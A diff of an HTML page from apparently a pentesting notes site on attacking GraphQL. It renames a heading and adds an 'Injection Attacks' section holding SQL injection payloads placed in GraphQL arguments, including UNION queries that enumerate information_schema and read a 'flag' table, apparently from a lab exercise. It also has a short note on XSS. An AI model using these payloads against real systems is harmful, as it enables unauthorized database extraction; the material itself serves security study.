@@ -934,9 +934,9 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#basic-example" class="md-nav__link">
+  <a href="#basic-examples" class="md-nav__link">
     <span class="md-ellipsis">
-      Basic Example
+      Basic Examples
     </span>
   </a>
   
@@ -1016,6 +1016,39 @@
   <a href="#exploiting-idor" class="md-nav__link">
     <span class="md-ellipsis">
       Exploiting IDOR
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#injection-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Injection Attacks
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Injection Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cross-site-scripting-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cross-Site Scripting (XSS)
     </span>
   </a>
   
@@ -1215,9 +1248,9 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#basic-example" class="md-nav__link">
+  <a href="#basic-examples" class="md-nav__link">
     <span class="md-ellipsis">
-      Basic Example
+      Basic Examples
     </span>
   </a>
   
@@ -1307,6 +1340,39 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#injection-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Injection Attacks
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Injection Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cross-site-scripting-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cross-Site Scripting (XSS)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -1325,7 +1391,7 @@
 
 <h1 id="attacking-graphql">Attacking GraphQL</h1>
 <p><strong><a href="https://graphql.org/learn/">GraphQL Learn</a></strong></p>
-<h2 id="basic-example">Basic Example</h2>
+<h2 id="basic-examples">Basic Examples</h2>
 <p><strong>GraphQL Request</strong>
 <div class="language-json highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JSON</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
@@ -1561,6 +1627,58 @@
 </span><span id="__span-9-5"><span class="w">  </span><span class="p">}</span>
 </span><span id="__span-9-6"><span class="p">}</span>
 </span></code></pre></div></td></tr></table></div>
+<h2 id="injection-attacks">Injection Attacks</h2>
+<h3 id="sql-injection">SQL Injection</h3>
+<ul>
+<li>Use introspection to identify what queries requiring arguments the backend supports</li>
+<li>Sending queries without arguments to see if error message is returned</li>
+<li>Try basic SQLi in the argument:
+<div class="language-json highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JSON</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><span class="p">{</span>
+</span><span id="__span-10-2"><span class="w">  </span><span class="err">user(user</span><span class="kc">na</span><span class="err">me</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;test&#39; -- -&quot;</span><span class="err">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-10-3"><span class="w">    </span><span class="err">user</span><span class="kc">na</span><span class="err">me</span>
+</span><span id="__span-10-4"><span class="w">    </span><span class="err">password</span>
+</span><span id="__span-10-5"><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-10-6"><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>or:
+<div class="language-json highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JSON</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><span class="p">{</span>
+</span><span id="__span-11-2"><span class="w">  </span><span class="err">user(user</span><span class="kc">na</span><span class="err">me</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;test&#39;&quot;</span><span class="err">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-11-3"><span class="w">    </span><span class="err">user</span><span class="kc">na</span><span class="err">me</span>
+</span><span id="__span-11-4"><span class="w">    </span><span class="err">password</span>
+</span><span id="__span-11-5"><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-11-6"><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>use results of introspection query to craft UNION-based SQLi:
+<img alt="introspection query results" src="../../images/introspection_results.png" />
+<div class="language-json highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JSON</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><span class="p">{</span>
+</span><span id="__span-12-2"><span class="w">  </span><span class="err">user(user</span><span class="kc">na</span><span class="err">me</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;x&#39; UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -&quot;</span><span class="err">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-12-3"><span class="w">    </span><span class="err">user</span><span class="kc">na</span><span class="err">me</span>
+</span><span id="__span-12-4"><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-12-5"><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-json highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JSON</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><span class="p">{</span><span class="nt">&quot;query&quot;</span><span class="p">:</span><span class="s2">&quot;{  user(username: \&quot;student&#39; UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name=&#39;flag&#39;-- -\&quot;) {    username  }}&quot;</span><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-json highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JSON</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><span class="p">{</span><span class="nt">&quot;query&quot;</span><span class="p">:</span><span class="s2">&quot;{  user(username: \&quot;student&#39; UNION SELECT 1,2,flag,4,5,6 FROM flag-- -\&quot;) {    username  }}&quot;</span><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h3 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h3>
+<p>XSS vulnerabilities can occur if:
+- GraphQL responses are inserted into the HTML page without proper sanitization
+- if invalid arguments are reflected in error messages</p>
 
 
 
